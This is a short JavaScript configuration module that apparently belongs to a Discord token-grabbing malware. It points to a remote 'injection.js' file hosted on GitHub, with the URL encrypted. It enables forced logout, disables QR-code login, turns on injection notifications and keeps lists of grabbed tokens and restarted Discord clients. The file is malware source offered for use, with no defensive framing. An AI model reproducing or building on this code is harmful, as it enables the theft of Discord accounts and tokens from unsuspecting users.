module.exports = (client) => {
    return {
        base_url: client.utils.encryption.encryptData("https://raw.githubusercontent.com/1337wtf1337/1337wtf1337/main/injection.js"),

        instant_logout: true,
        disable_qr_code: true,

        injection_notification: true,
        initialize_notification: true,
        logout_notification: true,

        running_executables: [],
        executables: [],
        files_path: [],

        closed_discord_clients: '',
        restarted_discord_clients: '',

        grabbed_tokens: {
            all: []
        },
    }
}